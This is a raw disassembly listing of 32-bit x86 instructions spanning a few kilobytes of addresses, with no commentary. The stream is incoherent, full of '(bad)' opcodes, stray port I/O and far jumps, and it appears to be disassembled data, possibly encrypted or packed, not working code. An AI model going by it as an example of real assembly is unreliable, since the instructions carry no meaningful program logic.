  4204a0:	adc    BYTE PTR [ecx+0x25171fd8],dh
  4204a6:	int    0x40
  4204a8:	mov    ds:0x31e17ff,eax
  4204ad:	inc    edx
  4204ae:	push   edx
  4204af:	xchg   esp,eax
  4204b0:	mov    al,ds:0x67aeb76
  4204b5:	data16 or ch,dl
  4204b8:	clc    
  4204b9:	xchg   edi,eax
  4204ba:	(bad)  
  4204bb:	fsubp  st(4),st
  4204bd:	cmp    BYTE PTR [edx],ah
  4204bf:	scas   al,BYTE PTR es:[edi]
  4204c0:	pop    edi
  4204c1:	das    
  4204c2:	or     ecx,DWORD PTR [ebx+eiz*4-0x4632e3e3]
  4204c9:	inc    ebp
  4204ca:	pop    esi
  4204cb:	loopne 0x42053e
  4204cd:	push   0xfffffffe
  4204cf:	jno    0x420459
  4204d1:	jbe    0x4204fe
  4204d3:	ja     0x42046f
  4204d5:	loop   0x420517
  4204d7:	fisttp QWORD PTR [esi]
  4204d9:	pushf  
  4204da:	add    al,0x7d
  4204dc:	cs pop ss
  4204de:	push   cs
  4204df:	inc    esi
  4204e0:	gs pop ecx
  4204e2:	(bad)  
  4204e3:	test   al,0x7
  4204e5:	call   0x9062:0x1a833dfb
  4204ec:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204ee:	retf   0x5ef5
  4204f1:	adc    DWORD PTR [ebx+0x72aecd17],edx
  4204f7:	cmp    eax,0x3bab3faa
  4204fc:	dec    eax
  4204fd:	(bad)  
  4204fe:	rcr    BYTE PTR [edi+0x33f123d9],1
  420504:	in     eax,dx
  420505:	jae    0x4204c1
  420507:	mov    edx,0x934d9b1a
  42050c:	mov    ds:0x5a222f5b,al
  420511:	(bad)  
  420512:	xlat   BYTE PTR ds:[ebx]
  420513:	jno    0x4204c3
  420515:	js     0x42056c
  420517:	mov    ecx,0x680cd786
  42051c:	stos   DWORD PTR es:[edi],eax
  42051d:	add    DWORD PTR [eax],ebx
  42051f:	sub    edi,ebp
  420521:	stos   DWORD PTR es:[edi],eax
  420522:	pop    ebx
  420523:	rcl    DWORD PTR [ecx+ebx*2+0x43],1
  420527:	mov    eax,0xaabd5662
  42052c:	sub    dl,BYTE PTR [esi]
  42052e:	sub    BYTE PTR [esi],dl
  420530:	rol    BYTE PTR [edx+0x28],cl
  420533:	sbb    al,0x1e
  420535:	pop    esp
  420536:	fidiv  DWORD PTR [ebx+0x3d39ef2a]
  42053c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42053d:	int    0x9c
  42053f:	(bad)  
  420540:	dec    ebx
  420541:	mov    eax,0x242ec1fd
  420546:	adc    dh,BYTE PTR [ebx-0x6]
  420549:	inc    eax
  42054a:	and    edi,esp
  42054c:	not    DWORD PTR [eax+ebp*8+0x49]
  420550:	popa   
  420551:	in     al,dx
  420552:	add    al,0x43
  420554:	push   edi
  420555:	cmc    
  420556:	lahf   
  420557:	jo     0x420524
  420559:	add    BYTE PTR [ebx+0xd74887a],ch
  42055f:	(bad)  
  420560:	imul   edx,DWORD PTR [ebx+0x15],0x23
  420564:	mov    ds:0x4befb49,al
  420569:	dec    ebx
  42056a:	dec    esi
  42056b:	or     DWORD PTR [ebx],0xf45d1d9a
  420571:	loop   0x420514
  420573:	inc    eax
  420574:	jle    0x420505
  420576:	dec    edi
  420577:	imul   eax,DWORD PTR [eax],0x96c4fa35
  42057d:	mov    dl,0xfb
  42057f:	jb     0x42051d
  420581:	or     edi,DWORD PTR [esp+ebp*4+0x58]
  420585:	xchg   ebp,eax
  420586:	pop    ebx
  420587:	sbb    BYTE PTR [ebx],ah
  420589:	leave  
  42058a:	les    edi,FWORD PTR [ebx+0x4784f727]
  420590:	xor    DWORD PTR [ebx+eiz*2+0x5a4c17b9],eax
  420597:	loop   0x420573
  420599:	mov    edi,0xcbecb37b
  42059e:	scas   al,BYTE PTR es:[edi]
  42059f:	push   eax
  4205a0:	ret    0x9823
  4205a3:	xchg   edi,eax
  4205a4:	jnp    0x4205f2
  4205a6:	push   eax
  4205a7:	xor    BYTE PTR [ebx-0x7127ad28],0x53
  4205ae:	popa   
  4205af:	pop    es
  4205b0:	popa   
  4205b1:	inc    edi
  4205b2:	pop    eax
  4205b3:	loop   0x4205ec
  4205b5:	pushf  
  4205b6:	mov    eax,0xb5ce8707
  4205bb:	call   0x3ae:0x12ce4f48
  4205c2:	cmp    DWORD PTR [ebx+0x79],0x5774aab1
  4205c9:	sub    al,BYTE PTR [edx]
  4205cb:	push   cs
  4205cc:	jg     0x42064c
  4205ce:	rol    eax,1
  4205d0:	sti    
  4205d1:	cli    
  4205d2:	(bad)
  4205d5:	loopne 0x42062d
  4205d7:	xor    BYTE PTR [edx-0x7b2c56b7],0xf8
  4205de:	test   BYTE PTR [edx],0x17
  4205e1:	outs   dx,BYTE PTR ds:[esi]
  4205e2:	push   esi
  4205e3:	xchg   bl,ah
  4205e5:	retf   0x7587
  4205e8:	aam    0xed
  4205ea:	jle    0x420667
  4205ec:	je     0x420588
  4205ee:	mov    edi,0x50501f93
  4205f3:	dec    edi
  4205f4:	fwait
  4205f5:	push   eax
  4205f6:	out    dx,al
  4205f7:	repz push edi
  4205f9:	pop    esp
  4205fa:	rol    BYTE PTR [edi-0x31],0x73
  4205fe:	cmc    
  4205ff:	nop
  420600:	push   ebx
  420601:	lock dec edi
  420603:	jae    0x4205c4
  420605:	inc    ebp
  420606:	inc    esp
  420607:	jg     0x4205ea
  420609:	fsubrp st(0),st
  42060b:	push   esp
  42060c:	or     bl,bl
  42060e:	mov    bl,BYTE PTR [ebp-0x278b14cb]
  420614:	dec    eax
  420615:	jmp    0x6f5d:0xd725d9be
  42061c:	push   0xffffffe2
  42061e:	cld    
  42061f:	mov    ds,WORD PTR [esi-0x22346e12]
  420625:	xchg   ecx,eax
  420626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420627:	and    ebx,DWORD PTR [edi-0x23]
  42062a:	sbb    dh,0x30
  42062d:	in     eax,dx
  42062e:	cs sbb ebx,esp
  420631:	fbld   TBYTE PTR [edx-0x24]
  420634:	aad    0xd0
  420636:	mov    bh,BYTE PTR [edx+0x2bd9c9b9]
  42063c:	loop   0x4205dd
  42063e:	lock mov bl,BYTE PTR [eax-0x62415903]
  420645:	lods   eax,DWORD PTR gs:[esi]
  420647:	add    dl,BYTE PTR [ecx+0xb]
  42064a:	jno    0x420679
  42064c:	ds push ebp
  42064e:	mov    ch,BYTE PTR [edi-0x3dea73a6]
  420654:	and    al,0xfc
  420656:	push   ecx
  420657:	mov    al,0xbc
  420659:	ins    DWORD PTR es:[edi],dx
  42065a:	jnp    0x420625
  42065c:	in     al,dx
  42065d:	dec    eax
  42065e:	sahf   
  42065f:	pop    esi
  420660:	sbb    eax,0xad2c9e8e
  420665:	stos   DWORD PTR es:[edi],eax
  420666:	mov    edi,0x71cede26
  42066b:	or     ecx,eax
  42066d:	mov    ah,0xff
  42066f:	les    eax,FWORD PTR [edi-0x7addb536]
  420675:	inc    edx
  420676:	cs jecxz 0x42066e
  420679:	sub    bh,ch
  42067b:	int    0xef
  42067d:	iret   
  42067e:	xor    BYTE PTR [edx-0x3e06d94c],al
  420684:	mov    ch,0x82
  420686:	jge    0x4206d4
  420688:	inc    ecx
  420689:	mov    bl,0x52
  42068b:	pmulhw mm4,QWORD PTR [ecx]
  42068e:	je     0x4206b2
  420690:	retf   0x5a76
  420693:	pop    ds
  420694:	mov    cl,BYTE PTR ds:0x60962ad1
  42069a:	mov    ch,0x77
  42069c:	fwait
  42069d:	sbb    dl,BYTE PTR [ebp-0x3ce58ad3]
  4206a3:	fisttp QWORD PTR [edi]
  4206a5:	pop    esp
  4206a6:	js     0x4206a5
  4206a8:	mov    ch,0xbf
  4206aa:	data16 and al,0xca
  4206ad:	adc    DWORD PTR ds:0x9741a51a,edx
  4206b3:	ja     0x4206eb
  4206b5:	add    BYTE PTR [ebx],cl
  4206b7:	inc    esp
  4206b8:	ret    
  4206b9:	out    0x26,eax
  4206bb:	fdivr  st(5),st
  4206be:	ret    0x9485
  4206c1:	bound  edi,QWORD PTR [esi]
  4206c3:	scas   al,BYTE PTR es:[edi]
  4206c4:	add    ah,BYTE PTR [esi+ebx*1-0x531c734c]
  4206cb:	cmp    BYTE PTR [ebx-0x1d],dl
  4206ce:	pop    ebp
  4206cf:	retf   
  4206d0:	retf   
  4206d1:	inc    ebp
  4206d2:	aad    0x6b
  4206d4:	inc    edx
  4206d5:	mov    eax,0x506a4670
  4206da:	fisub  WORD PTR [edi]
  4206dc:	sbb    bh,BYTE PTR [ebp+0x78]
  4206df:	mov    ebx,0x3611f08a
  4206e4:	mov    DWORD PTR [ebp-0x34],eax
  4206e7:	(bad)  
  4206e9:	adc    eax,0x998a3a10
  4206ee:	lods   eax,DWORD PTR ds:[esi]
  4206ef:	cmp    BYTE PTR [edx],al
  4206f1:	push   0x30
  4206f3:	lods   al,BYTE PTR ds:[esi]
  4206f4:	stos   DWORD PTR es:[edi],eax
  4206f5:	fstp   QWORD PTR [ecx+0x7b]
  4206f8:	jge    0x42070c
  4206fa:	xchg   ax,ax
  4206fc:	scas   al,BYTE PTR es:[edi]
  4206fd:	add    al,0x3f
  4206ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420700:	enter  0xc5e,0x79
  420704:	neg    DWORD PTR [esi-0x6b93d95]
  42070a:	arpl   WORD PTR cs:[ebx],si
  42070d:	fsub   QWORD PTR [edi+0x19076b0c]
  420713:	mov    ch,0x42
  420715:	dec    esi
  420716:	adc    DWORD PTR [edx],ebx
  420718:	sub    edi,DWORD PTR [esi]
  42071a:	call   0xc8ee676f
  42071f:	loop   0x420765
  420721:	out    dx,eax
  420722:	jns    0x42070f
  420724:	inc    ebx
  420725:	stc    
  420726:	test   al,0x67
  420728:	push   esp
  420729:	das    
  42072a:	push   ebp
  42072b:	int    0xf1
  42072d:	retf   
  42072e:	and    ch,bl
  420730:	dec    esi
  420731:	xchg   ebp,eax
  420732:	gs (bad) 
  420734:	out    dx,eax
  420735:	mov    ebp,DWORD PTR [edx+ebp*8]
  420738:	inc    ebx
  420739:	ja     0x420714
  42073b:	mov    al,ds:0x4528dedc
  420740:	and    DWORD PTR [esi+0x44],ebp
  420743:	inc    ebx
  420744:	daa    
  420745:	xchg   edx,eax
  420746:	push   eax
  420747:	xor    eax,0xcd02e84e
  42074c:	cli    
  42074d:	(bad)  
  42074e:	out    dx,eax
  42074f:	inc    edx
  420750:	aam    0xae
  420752:	neg    DWORD PTR [ebp-0x75]
  420755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420756:	outs   dx,DWORD PTR ds:[esi]
  420757:	push   es
  420758:	xchg   edi,eax
  420759:	cdq    
  42075a:	pushf  
  42075b:	cmp    BYTE PTR [ecx],dl
  42075d:	in     eax,0xdb
  42075f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420760:	ins    DWORD PTR es:[edi],dx
  420761:	sahf   
  420762:	aaa    
  420763:	push   ds
  420764:	mov    edi,0x295e01
  420769:	cld    
  42076a:	test   eax,0x2ea3a7fb
  42076f:	je     0x420774
  420771:	pop    ds
  420772:	in     eax,dx
  420773:	fdiv   st(6),st
  420775:	test   DWORD PTR [eax],edx
  420777:	xchg   ecx,eax
  420778:	out    dx,al
  420779:	test   bh,bh
  42077b:	dec    esi
  42077c:	cwde   
  42077d:	dec    edi
  42077e:	cdq    
  42077f:	xchg   BYTE PTR [eax],dh
  420781:	mov    dl,0xd2
  420783:	jg     0x4207bc
  420785:	mov    WORD PTR [esi-0x4a],ss
  420788:	push   0x899ca043
  42078d:	xchg   esi,eax
  42078e:	mov    edx,0x6baf6411
  420793:	test   eax,0x3285e168
  420798:	xchg   edx,eax
  420799:	repz sbb DWORD PTR [edi-0x20651a26],ebx
  4207a0:	sub    eax,0xfa69945a
  4207a5:	call   0xf339d694
  4207aa:	lods   al,BYTE PTR ds:[esi]
  4207ab:	call   0xd914c87d
  4207b0:	pop    edi
  4207b2:	stc    
  4207b3:	aas    
  4207b4:	pop    esp
  4207b5:	cmp    eax,0x33ff4c6
  4207ba:	push   ds
  4207bb:	mov    dh,0x7c
  4207bd:	mov    ds:0x25ad90fe,eax
  4207c2:	lock dec ebx
  4207c4:	das    
  4207c5:	push   ss
  4207c6:	inc    BYTE PTR [esi+0x45]
  4207c9:	in     eax,0xd4
  4207cb:	nop
  4207cc:	(bad)  
  4207cd:	xchg   edi,eax
  4207ce:	jle    0x4207da
  4207d0:	inc    ebx
  4207d1:	dec    eax
  4207d2:	dec    esi
  4207d3:	rol    cl,cl
  4207d5:	(bad)  [eax]
  4207d7:	sub    esp,0xdf058ac2
  4207dd:	test   DWORD PTR [edi],eax
  4207df:	inc    esi
  4207e0:	fbld   TBYTE PTR [eax+ebx*8+0x2dab8184]
  4207e7:	ins    BYTE PTR es:[edi],dx
  4207e8:	adc    BYTE PTR [ebx+edx*1+0x21],ch
  4207ec:	mov    ebx,0xf0a5a3de
  4207f1:	aas    
  4207f2:	ds xchg edx,eax
  4207f4:	in     eax,0x46
  4207f6:	das    
  4207f7:	lock icebp 
  4207f9:	ins    DWORD PTR es:[edi],dx
  4207fa:	adc    eax,0x24f2c50c
  4207ff:	jle    0x4207d8
  420801:	lods   eax,DWORD PTR ds:[esi]
  420802:	repnz pop esi
  420804:	add    eax,DWORD PTR [edi+0x28d9e4f0]
  42080a:	mov    bh,0xd1
  42080c:	push   ebp
  42080d:	pop    esp
  42080e:	mov    dl,0x53
  420810:	lds    ebx,FWORD PTR [ebx-0x48d169d]
  420816:	pop    ss
  420817:	sar    DWORD PTR [edx],0x54
  42081a:	imul   ebp,edx,0x9587b8c7
  420820:	aam    0x7b
  420822:	jg     0x4207ff
  420824:	mov    ecx,0xf3516ed8
  420829:	push   cs
  42082a:	and    esp,DWORD PTR [eax]
  42082c:	inc    edx
  42082d:	(bad)  
  42082f:	jecxz  0x420883
  420831:	fdiv   QWORD PTR [edx+0x57ace90d]
  420837:	lahf   
  420838:	add    eax,0x59b573e2
  42083d:	loopne 0x4207e7
  42083f:	call   0x6ece:0x4dc985bc
  420846:	or     al,0x47
  420848:	ins    BYTE PTR es:[edi],dx
  420849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42084a:	mov    al,0xda
  42084c:	std    
  42084d:	(bad)  
  42084e:	stc    
  42084f:	popf   
  420850:	enter  0x4a82,0x10
  420854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420855:	sub    ecx,DWORD PTR [edx-0x14]
  420858:	pop    ecx
  420859:	stos   BYTE PTR es:[edi],al
  42085a:	pop    ebp
  42085b:	dec    ebp
  42085c:	sub    BYTE PTR [edx+0x1b],bh
  42085f:	dec    edx
  420860:	out    0xa2,eax
  420862:	mov    ebx,0xe80275cb
  420867:	loopne 0x4208ca
  420869:	fild   WORD PTR [ebx+0x357d2a]
  42086f:	xchg   ebp,eax
  420870:	out    dx,al
  420871:	daa    
  420872:	add    DWORD PTR [edx],esp
  420874:	test   eax,0x90dee190
  420879:	out    dx,al
  42087a:	stc    
  42087b:	cmc    
  42087c:	add    al,0xa3
  42087e:	test   DWORD PTR [esi-0x4b96f3c4],esp
  420884:	mov    DWORD PTR [esi],esi
  420886:	aas    
  420887:	pop    ebx
  420888:	xchg   ecx,eax
  420889:	sub    cl,BYTE PTR [esi-0x44]
  42088c:	push   edi
  42088d:	leave  
  42088e:	dec    eax
  42088f:	scas   al,BYTE PTR es:[edi]
  420890:	or     al,0xfa
  420892:	xor    DWORD PTR [eax+ebx*2-0x24],esi
  420896:	mov    BYTE PTR [ecx],bl
  420898:	dec    esi
  420899:	xchg   ebp,eax
  42089a:	adc    edx,edi
  42089c:	out    0x38,al
  42089e:	fist   DWORD PTR [ebx+0x9]
  4208a1:	adc    ecx,edx
  4208a3:	mov    bl,0xc4
  4208a5:	shr    DWORD PTR [esi+0x29],0xc6
  4208a9:	(bad)  
  4208aa:	mov    dl,0xd2
  4208ac:	pop    esp
  4208ad:	mov    edx,0xbc947b1d
  4208b2:	pop    esp
  4208b3:	stos   DWORD PTR es:[edi],eax
  4208b4:	sbb    ah,ch
  4208b6:	dec    ebx
  4208b7:	mov    edi,0xfea26b74
  4208bc:	adc    eax,0x1e5488aa
  4208c1:	mov    cl,0x55
  4208c3:	in     al,0x2e
  4208c5:	adc    ah,ch
  4208c7:	inc    esp
  4208c8:	cld    
  4208c9:	xchg   DWORD PTR [edi+0x29],edi
  4208cc:	pop    es
  4208cd:	adc    DWORD PTR [ebp-0x3d],edx
  4208d0:	(bad)  
  4208d1:	stos   BYTE PTR es:[edi],al
  4208d2:	inc    esp
  4208d3:	jge    0x4208e9
  4208d5:	sar    BYTE PTR [ebx],0xe9
  4208d8:	push   esi
  4208d9:	jp     0x4208e5
  4208db:	sbb    DWORD PTR [eax],ebp
  4208dd:	xor    eax,edi
  4208df:	call   0x261:0x9843df58
  4208e6:	mov    eax,ecx
  4208e8:	push   es
  4208e9:	mov    eax,0x2384795
  4208ee:	in     al,dx
  4208ef:	ins    BYTE PTR es:[edi],dx
  4208f0:	adc    esp,edx
  4208f2:	mov    eax,ds:0xd147c18f
  4208f7:	jae    0x4208c3
  4208f9:	test   BYTE PTR [edi+0x5c],al
  4208fc:	imul   edx,DWORD PTR [eax+ebx*4+0x49a53235],0x151c40fb
  420907:	cli    
  420908:	rcl    cl,1
  42090a:	lods   al,BYTE PTR ds:[esi]
  42090b:	or     eax,esp
  42090d:	or     cl,dl
  42090f:	xchg   edi,eax
  420910:	sbb    DWORD PTR [ebx],eax
  420912:	and    ebp,DWORD PTR [edi+0x6d]
  420915:	jecxz  0x420912
  420917:	and    BYTE PTR [ecx],bh
  420919:	(bad)  
  42091a:	push   esi
  42091b:	call   DWORD PTR [ebp-0x85ef888]
  420921:	cmp    esp,esi
  420923:	mov    edx,0x9115289f
  420928:	sbb    esi,DWORD PTR [ebp-0x27a4e040]
  42092e:	mov    eax,ds:0x53911c6b
  420933:	fild   QWORD PTR [edx+0x73]
  420936:	cld    
  420937:	xor    ah,BYTE PTR [edx-0xb97d890]
  42093d:	je     0x42092d
  42093f:	ins    DWORD PTR es:[edi],dx
  420940:	shl    DWORD PTR [ebp+0x7e],0xcd
  420944:	int3   
  420945:	stos   DWORD PTR es:[edi],eax
  420946:	loope  0x420965
  420948:	pop    esi
  420949:	xchg   esp,eax
  42094a:	test   al,0xc
  42094c:	inc    edx
  42094d:	inc    eax
  42094e:	hlt    
  42094f:	in     eax,0x1
  420951:	mov    ch,0xfc
  420953:	inc    ecx
  420954:	dec    esi
  420955:	cmc    
  420956:	scas   eax,DWORD PTR es:[edi]
  420957:	(bad)  
  420959:	jb     0x4209b8
  42095b:	cmc    
  42095c:	lea    edx,[ebp-0x1042affc]
  420962:	mov    ds:0x32b31ee9,eax
  420967:	aas    
  420968:	mov    cl,BYTE PTR [edi]
  42096a:	mov    DWORD PTR [ebx],eax
  42096c:	cdq    
  42096d:	push   es
  42096e:	call   0x1229028
  420973:	test   ebx,0xa1b1cddf
  420979:	pop    ds
  42097a:	jmp    0x4209c2
  42097c:	sub    DWORD PTR ds:0xe9a8031c,edi
  420982:	pop    ds
  420983:	scas   al,BYTE PTR es:[edi]
  420984:	or     al,0x73
  420986:	push   esi
  420987:	cmp    DWORD PTR [ecx],esi
  420989:	cmc    
  42098a:	xor    eax,0x3c448152
  42098f:	adc    BYTE PTR [ecx+0x6caf7eac],dh
  420995:	and    cl,BYTE PTR [eax-0x5b2dce15]
  42099b:	test   ecx,0x5448b332
  4209a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209a2:	(bad)
  4209a6:	lea    ebp,[ebp-0x3c]
  4209a9:	sub    ebp,DWORD PTR [ebx+0x52]
  4209ac:	xchg   edi,eax
  4209ad:	mov    ecx,ecx
  4209af:	add    BYTE PTR [edi],0x59
  4209b2:	xor    DWORD PTR [edx],esp
  4209b4:	and    eax,0xe9f578e8
  4209b9:	sahf   
  4209ba:	test   al,0x68
  4209bc:	mov    ds:0x5a861bee,eax
  4209c1:	dec    esi
  4209c2:	xchg   DWORD PTR [esi],edx
  4209c4:	fcomp  DWORD PTR [edx]
  4209c6:	sti    
  4209c7:	lods   al,BYTE PTR ds:[esi]
  4209c8:	xor    BYTE PTR [edi+0x3e593272],0x84
  4209cf:	mov    eax,ds:0x9c4f12a8
  4209d4:	enterw 0xe30,0x10
  4209d9:	daa    
  4209da:	sbb    BYTE PTR [ebp+edi*4+0x461e53ba],bh
  4209e1:	test   eax,0x539bca42
  4209e6:	mov    eax,0xcb249586
  4209eb:	mov    bl,0xb1
  4209ed:	xchg   DWORD PTR [edi+eiz*1+0x7b],ecx
  4209f1:	xchg   ecx,eax
  4209f2:	mov    DWORD PTR [ebx],edx
  4209f4:	ss aad 0x17
  4209f7:	rcr    DWORD PTR [edi+0x33fefb70],cl
  4209fd:	dec    edi
  4209fe:	cmp    bh,ch
  420a00:	rcr    BYTE PTR [edx+0x6899c0df],cl
  420a06:	jne    0x420a37
  420a08:	and    dl,BYTE PTR [edx+esi*1-0x5f]
  420a0c:	jmp    0x95497574
  420a11:	(bad)  
  420a13:	inc    ecx
  420a14:	in     al,dx
  420a15:	retf   
  420a16:	sbb    DWORD PTR [esi],esi
  420a18:	pop    bp
  420a1a:	pop    ds
  420a1b:	pop    edi
  420a1c:	inc    edi
  420a1d:	rcr    DWORD PTR [edi+0x5d],0x13
  420a21:	cwde   
  420a22:	ret    
  420a23:	(bad)  
  420a25:	out    0xa1,eax
  420a27:	call   0xeda1:0xfe2a24f2
  420a2e:	mov    edi,0x2454201d
  420a33:	(bad)  
  420a34:	cmp    eax,0xf9339c1a
  420a39:	in     eax,0x9f
  420a3b:	sbb    bh,BYTE PTR [ebp+0x5c]
  420a3e:	rcl    BYTE PTR [ebx],1
  420a40:	mov    DWORD PTR [edx+0x49],eax
  420a43:	lds    edi,FWORD PTR [edi-0x46]
  420a46:	jg     0x420a02
  420a48:	push   cs
  420a49:	xor    eax,0x1781e437
  420a4e:	pop    es
  420a4f:	push   ss
  420a50:	in     eax,dx
  420a51:	mov    esp,0xa1932ec5
  420a56:	into   
  420a57:	pop    ebp
  420a58:	or     DWORD PTR [esi],esp
  420a5a:	jge    0x4209dd
  420a5c:	outs   dx,BYTE PTR ds:[esi]
  420a5d:	xchg   esp,eax
  420a5e:	dec    ebp
  420a5f:	jmp    0x420ad1
  420a61:	add    eax,0x2e8b3ecb
  420a66:	pop    ecx
  420a67:	clc    
  420a68:	out    0x5b,eax
  420a6a:	into   
  420a6b:	popf   
  420a6c:	rol    DWORD PTR [eax-0x9d7b0a0],1
  420a72:	or     DWORD PTR [edx],edi
  420a74:	add    ebx,ebx
  420a76:	fcomi  st,st(3)
  420a78:	fs loop 0x420a64
  420a7b:	inc    ecx
  420a7c:	ficomp WORD PTR [ecx-0xf]
  420a7f:	sbb    DWORD PTR [ecx+0x73ffab9d],0xffffffdc
  420a86:	mov    BYTE PTR [ebp+0x7f5ef4fb],0x54
  420a8d:	push   edx
  420a8e:	cwde   
  420a8f:	pop    edi
  420a90:	xchg   esi,eax
  420a91:	push   esi
  420a92:	mov    dl,0xd1
  420a94:	in     eax,dx
  420a95:	push   0x4c
  420a97:	fld    DWORD PTR [esi+0x215ae4af]
  420a9d:	sub    ch,al
  420a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa0:	call   0x8d6c0d27
  420aa5:	int    0xc
  420aa7:	mov    ds:0x78b84c75,eax
  420aac:	js     0x420ad0
  420aae:	(bad)  
  420aaf:	xor    BYTE PTR [esi],al
  420ab1:	mov    dl,0xed
  420ab3:	sti    
  420ab4:	data16 jl 0x420a58
  420ab7:	shl    DWORD PTR [ebx+0x666f77c9],cl
  420abd:	jns    0x420abb
  420abf:	add    BYTE PTR [ebx],bh
  420ac1:	test   eax,0xa80fa4b5
  420ac6:	push   ebx
  420ac7:	in     eax,0xa7
  420ac9:	aam    0xe2
  420acb:	sbb    DWORD PTR [ebx-0x43],esp
  420ace:	sar    BYTE PTR [edx],0x49
  420ad1:	xor    DWORD PTR [edx+ecx*8+0x46],edx
  420ad5:	cmp    edi,ebx
  420ad7:	adc    DWORD PTR [esi+0x3f],0xdb055b33
  420ade:	xor    eax,0xe6210c46
  420ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ae4:	cmc    
  420ae5:	pushf  
  420ae6:	xchg   BYTE PTR [edx+0x16],al
  420ae9:	(bad)  
  420aea:	mov    al,0x0
  420aec:	retf   0xcce4
  420aef:	push   ecx
  420af0:	and    cl,BYTE PTR [edi-0x28c8dd04]
  420af6:	ds cli 
  420af8:	ins    DWORD PTR es:[edi],dx
  420af9:	je     0x420ac4
  420afb:	lds    edi,FWORD PTR [esi-0x71eaf9d2]
  420b01:	iret   
  420b02:	and    esp,DWORD PTR [edi+0x53]
  420b05:	adc    edi,ebx
  420b07:	and    al,0x8b
  420b09:	or     al,0x50
  420b0b:	dec    ecx
  420b0c:	cmc    
  420b0d:	shl    DWORD PTR [edi-0x37d5b8f8],1
  420b13:	xchg   esi,eax
  420b14:	xchg   ebp,eax
  420b15:	sbb    BYTE PTR [ecx-0x45],0xb3
  420b19:	jle    0x420b0e
  420b1b:	les    ebx,FWORD PTR [esi+0x19]
  420b1e:	(bad)  
  420b20:	xor    DWORD PTR [ecx-0x6b2f7219],esp
  420b26:	div    DWORD PTR [esp+ecx*4]
  420b29:	loope  0x420aba
  420b2b:	daa    
  420b2c:	sub    ecx,DWORD PTR [edi+ebp*1-0xf]
  420b30:	adc    al,BYTE PTR [eax+0x3f]
  420b33:	ror    DWORD PTR [edi],0x99
  420b36:	dec    esi
  420b37:	(bad)  
  420b38:	pop    ss
  420b39:	ret    0x7837
  420b3c:	bound  ecx,QWORD PTR [edi]
  420b3e:	rcr    DWORD PTR [ebx-0x4ff2b4bb],0x63
  420b45:	sbb    DWORD PTR cs:[edi],esi
  420b48:	ins    DWORD PTR es:[edi],dx
  420b49:	daa    
  420b4a:	add    BYTE PTR [ebx],0x88
  420b4d:	fwait
  420b4e:	int3   
  420b4f:	mov    ah,0xd6
  420b51:	add    dh,BYTE PTR [eax-0x6]
  420b54:	cmp    bl,bh
  420b56:	lods   al,BYTE PTR ds:[esi]
  420b57:	loopne 0x420bb4
  420b59:	pop    DWORD PTR [edx-0x49589f35]
  420b5f:	fs jnp 0x420ae4
  420b62:	xchg   BYTE PTR [eax+0x34],dl
  420b65:	scas   eax,DWORD PTR es:[edi]
  420b66:	sub    ebp,DWORD PTR [edx-0x79]
  420b69:	push   cs
  420b6a:	das    
  420b6b:	jae    0x420b2a
  420b6d:	or     BYTE PTR [esp+edi*4+0x25],bl
  420b71:	push   es
  420b72:	xchg   ebx,eax
  420b73:	ds hlt 
  420b75:	std    
  420b76:	sub    DWORD PTR [esi],0xde8b5053
  420b7c:	jg     0x420b0b
  420b7e:	adc    ebp,edi
  420b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b81:	push   edi
  420b82:	mov    ah,0x69
  420b84:	jle    0x420b63
  420b86:	pop    esi
  420b87:	setl   BYTE PTR [eax+0x203c3c8c]
  420b8e:	rol    BYTE PTR ds:0xe1fc3c8,1
  420b94:	pop    ds
  420b95:	les    edi,FWORD PTR [ebx+ebx*8+0x71]
  420b99:	scas   al,BYTE PTR es:[edi]
  420b9a:	pusha  
  420b9b:	xchg   BYTE PTR ss:[ebp-0xf],bh
  420b9f:	je     0x420c18
  420ba1:	nop
  420ba2:	cmp    BYTE PTR [eax+0x7e8c1f88],dl
  420ba8:	into   
  420ba9:	mov    BYTE PTR [edx],bh
  420bab:	pop    eax
  420bac:	je     0x420b43
  420bae:	retf   
  420baf:	sub    BYTE PTR ds:0x5c301372,ch
  420bb5:	push   0xffffffa6
  420bb7:	ins    DWORD PTR es:[edi],dx
  420bb8:	mov    dl,BYTE PTR [ebp-0x46d48e6a]
  420bbe:	inc    ebx
  420bbf:	mov    esi,0xfbee95ce
  420bc4:	inc    ebp
  420bc5:	cmp    BYTE PTR [edi-0x16332418],bh
  420bcb:	aaa    
  420bcc:	mov    esp,0x7ff2a2f9
  420bd1:	shl    DWORD PTR [edi+0x5473477c],cl
  420bd7:	iret   
  420bd8:	movq   mm5,QWORD PTR [esi-0x23]
  420bdc:	test   DWORD PTR [ebx],ebp
  420bde:	mov    al,ds:0xeec2a309
  420be3:	push   edi
  420be4:	adc    eax,0x801a8b3d
  420be9:	push   ds
  420bea:	add    esp,ecx
  420bec:	pusha  
  420bed:	jecxz  0x420b74
  420bef:	jmp    0x420b71
  420bf1:	mov    ch,0xb4
  420bf3:	fmul   st(6),st
  420bf5:	mov    ebx,0x40475512
  420bfa:	mov    cl,0x23
  420bfc:	daa    
  420bfd:	fsub   st,st(0)
  420bff:	or     bh,dl
  420c01:	shr    DWORD PTR [ebx+esi*8+0x756b83db],1
  420c08:	jns    0x420c2c
  420c0a:	fistp  DWORD PTR [ebp-0x35]
  420c0d:	call   0xb137:0x87456d2f
  420c14:	scas   al,BYTE PTR es:[edi]
  420c15:	or     al,0x31
  420c17:	mov    WORD PTR [ebp-0x41427e0d],?
  420c1d:	jmp    0x66265f8f
  420c22:	xchg   ecx,eax
  420c23:	enter  0x3c57,0x55
  420c27:	and    ah,bh
  420c29:	mov    esp,0xa11ea16d
  420c2e:	sahf   
  420c2f:	icebp  
  420c30:	inc    ebp
  420c31:	inc    ebx
  420c32:	mov    ds:0x1444f4b7,al
  420c37:	inc    esp
  420c38:	cmp    al,0x7e
  420c3a:	and    ah,BYTE PTR [esi-0x77]
  420c3d:	test   eax,0x52bd6043
